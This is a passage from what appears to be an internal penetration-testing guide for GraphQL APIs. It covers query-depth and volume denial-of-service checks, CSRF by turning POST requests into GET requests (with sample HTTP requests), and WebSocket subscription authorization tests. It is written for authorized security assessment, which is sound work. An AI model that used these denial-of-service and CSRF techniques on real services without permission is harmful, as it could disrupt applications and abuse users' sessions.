+                       ETC...
+                      } 
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}</code></pre></div><p></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Unexpected HTTP Failure</span></h2><p><strong>Verification Instructions:</strong></p><ol><li><p>Review the <strong>GraphQL: Large Query Depth Permitted</strong> instructions above. Note that if you begin building a query by cycling through a loop, and you get a 502 response or another similar server error before exceeding the maximum query depth, than this would be a good informational finding. At this point the issue is more development/software design oriented but still good to let the client know about.</p></li><li><p>You could also consider trying to get unexpected HTTP failures through other methods like passing in 9000 for items returned instead of 4 if allowed to set the return amount value.</p></li><li><p><strong>IF YOU CAUSE AN ACTUAL DOS CONDITION BY ACCIDENT (BRING THE ENTIRE APPLICATION DOWN FOR A LONG PERIOD OF TIME),</strong> upgrade the severity of the finding from Informational to Medium with the verification step being the HTTP request that caused the DOS condition.</p></li></ol><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Server Timeouts</span></h2><p>In some cases you might only have a query depth of 1 or 2 and cause a consistent 502 or application timeout. This might be due to the fact that you are returning so much data either the server, proxy, etc. can’t handle it. Since its unclear at what aspect the data might be failing, NetSPI added an informational finding called <code class="inline" spellcheck="false">GraphQL - Lack of Volumetric Data Management Controls</code> .</p><p><strong>Verification Instructions:</strong></p><ol><li><p>If you can cause a server timeout reliably with only a query depth of 1 or 2 and the finding does not fall into the <code class="inline" spellcheck="false">Lack of Aliasing or Batching Limits</code> or <code class="inline" spellcheck="false">Large Query Depth Permitted</code> , add this informational finding. Show the query and the server timeout. Make a note of the time delay before the server timeout response.</p></li></ol><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL CSRF</span></h2><p>The previous examples showed GraphQL calls as a POST request. However, GraphQL also supports GET requests. If you can find a sensitive API call that impacts functionality (usually a mutation) that allows GET requests with CSRF-attackable cookies, than you can get a CSRF finding. In some cases CSRF is possible with queries but are blocked for mutations as intended since queries generally don’t impact functionality.</p><ol><li><p>If the InQL extension is loaded, right click on the request in Repeater, navigate to Extensions, and choose the “Send to Repeater (Get – Query Params)” to see if it works.&nbsp;InQL supports other format transitions for the query (ex. form-data, url-encoded) so try those as well.</p></li><li><p>If this does not work, try altering the GET URL slightly. For example, if the service is using variables, try hardcoding this into the query to avoid the extra query parameters. Edit the original API call in the original POST request using GraphQL raider to assist. Once the variables are removed, try sending to Repeater again and removing the “variables” parameter from the URL.</p></li></ol><p><strong>POST Request</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Cookies: [Cookies]
+Content-Length: #
+
+{
+  "operationName": "getGroups",
+  "variables": {
+    "groupId": 1234
+  }
+  "query": "query getGroups($groupId: ID!){\n groups(group:$groupId) {\n groupName \n numberOfMembers}"
+}</code></pre></div><p><strong>GET Request #1 (With Variables)</strong></p><div class="code-block with-line-numbers" data-language=""><pre><code spellcheck="false">GET /graphql?query=query getGroups($groupId: ID!){\n groups(group:$groupId) {\n groupName \n numberOfMembers}&amp;operationName=getGroups&amp;variables={"groupId": 1234} HTTP/1.1
+Host: netspi.com
+Cookies: [Cookies]
+Content-Length: #</code></pre></div><p><strong>GET Request #1 (No Variables)</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">GET /graphql?query=query getGroups($groupId: 1234){\n groups(group:$groupId) {\n groupName \n numberOfMembers}&amp;operationName=getGroup HTTP/1.1
+Host: netspi.com
+Cookies: [Cookies]
+Content-Length: #</code></pre></div><p><strong>References:</strong></p><ul><li><p><a href="https://www.apollographql.com/docs/apollo-server/v2/requests/" rel="noopener noreferrer nofollow">https://www.apollographql.com/docs/apollo-server/v2/requests/</a></p></li><li><p><a href="https://blog.doyensec.com/2021/05/20/graphql-csrf.html" rel="noopener noreferrer nofollow">https://blog.doyensec.com/2021/05/20/graphql-csrf.html</a></p></li><li><p><a href="https://portswigger.net/daily-swig/overlooked-vulnerabilities-in-graphql-open-the-door-to-cross-site-request-forgery-attacks" rel="noopener noreferrer nofollow">https://portswigger.net/daily-swig/overlooked-vulnerabilities-in-graphql-open-the-door-to-cross-site-request-forgery-attacks</a></p></li></ul><p></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: WebSocket Inspection</span></h2><p>Under your Burp Suite project proxy tab, you should have a tab called “Websockets history”</p><p></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/db24b176-d135-4de7-a739-7234d24905f6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=0344f5e7c8988037f61a638afbe6a809b6a370f2dbd8d6215894d586bd908201&X-Amz-SignedHeaders=host&response-content-disposition=attachment" contenteditable="false"><p class="caption"></p></div></p><p></p><p>As you navigate the client website, make sure to check in to this tab and see if any Websocket requests are being sent. Sending GraphQL API calls over WebSockets is a possible mechanism and it is easy to miss it if you don’t see the traffic in this tab. Generally, I have seen this a LOT with subscriptions. So while navigating the site you might see a GraphQL subscribe request get sent to the server via Websockets. Later, if you change some data or perform some action, you might see data returned to you from the server that correlates to the earlier subscription.</p><p>With this in mind, see if you can:</p><ol><li><p>Subscribe to topics you should not be able to access as a lower level user. If you find MFLAC violations, this would align with the GraphQL: MFLAC violation</p></li><li><p>If the client is sending GraphQL requests over Websockets, understand the format and try to send a query or mutation over Websockets via the Repeater tab. It might be the client has configured authorization for the HTTP socket, but has left a websocket socket open without any authorization controls.</p></li></ol><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL IDOR, SQL Injection, etc.</span></h2><p>A lot of GraphQL vulnerabilities fall under existing findings. If you have an IDOR or SQLi, for example, that would go under the existing IDOR finding.</p><p></p><p></p><p></p><p></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">TODOs/Suggestion Box (Coming Soon (Hopefully)):</span></h2><ul><li><p>Write few specific instructions for AWS AppSync tests</p></li><li><p>Look into possible new tooling to improve process</p></li><li><p>[Feel Free to Add Anything Else As you Come Across It]</p></li></ul><p></p></div></div></article></body></html>
